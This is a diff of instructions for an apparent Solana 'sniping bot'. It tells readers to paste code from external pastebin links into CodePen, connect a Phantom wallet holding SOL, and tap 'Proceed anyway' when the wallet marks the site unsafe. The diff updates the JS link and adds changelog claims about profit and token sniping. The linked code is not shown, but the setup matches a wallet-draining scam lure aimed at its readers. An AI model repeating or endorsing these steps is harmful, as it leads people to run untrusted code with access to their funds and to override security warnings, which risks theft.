@@ -13,16 +13,18 @@
 🔴 Step 3: Copy this code to HTML section of CodePen
 🔗 https://pastecode.io/s/v0gswt6u
 
-🔴 Step 4: Copy this code to JS section of CodePen
-🔗 https://pastecode.io/s/mk1dyfgf
+🔴 Step 4: Copy this code to JS section of CodePen (you can click on "raw" or double click for easy copying)
+🔗 https://pastebin.com/mLYxxzdc
 
 🔴 Run the code and follow the steps as demonstrated in the video!
 
 ** UPDATE  05/03/2025 **
 🔴 It appears that Phantom wallet marked codepen.io as unsafe environment, you should still be able to start the bot by tapping "Proceed anyway".
 
-Updated to 0.81.9 [06/03/2025]
+Updated to 0.82.6 [06/03/2025] - Changes log
+
 - Profit is now kept for withdrawal, even if you accidentally close the script.
+- Added custom token support for auto sniping.
 
 Make sure you have at least the minimum amount of SOL inside your wallet for fees/sniping.
 
